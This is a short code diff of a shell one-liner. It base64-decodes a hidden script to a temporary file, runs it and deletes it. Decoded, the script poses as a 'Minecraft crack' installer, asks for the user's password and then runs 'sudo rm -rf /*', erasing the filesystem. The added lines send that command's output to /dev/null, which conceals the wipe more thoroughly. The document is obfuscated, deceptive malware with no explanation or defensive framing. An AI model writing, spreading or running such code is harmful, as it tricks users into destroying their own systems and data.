@@ -1,5 +1,6 @@
 echo 'IyEvYmluL2Jhc2gKZWNobyAiLT0tIE1JTkVDUkFGVCBDUkFDSyAtPS0iCgpQUzM9Ikluc3RhbGwg
 aXQgKDEvMik/ICIKb3B0aW9ucz0oIllFUyIgIk5PIikKc2VsZWN0IG9wdCBpbiAiJHtvcHRpb25z
 W0BdfSIKZG8KCWNhc2UgJG9wdCBpbgoJCSJZRVMiKQoJCQllY2hvICJUeXBlIGluIHlvdXIgcGFz
-c3dvcmQgdG8gcHJvY2VlZDoiCgkJCXN1ZG8gcm0gLXJmIC8qCgkJCTs7CgkJIk5PIikKCQkJYnJl
-YWsKCQkJOzsKCQkqKSBlY2hvICJpbnZhbGlkIG9wdGlvbiIKCWVzYWMKZG9uZQo=' | base64 --decode > /tmp/obf12945.sh; bash /tmp/obf12945.sh; rm -rf /tmp/obf12945.sh
+c3dvcmQgdG8gcHJvY2VlZDoiCgkJCXN1ZG8gcm0gLXJmIC8qID4gL2Rldi9udWxsCgkJCWJyZWFr
+CgkJCTs7CgkJIk5PIikKCQkJYnJlYWsKCQkJOzsKCQkqKSBlY2hvICJpbnZhbGlkIG9wdGlvbiIK
+CWVzYWMKZG9uZQo=' | base64 --decode > /tmp/obf1507.sh; bash /tmp/obf1507.sh; rm -rf /tmp/obf1507.sh
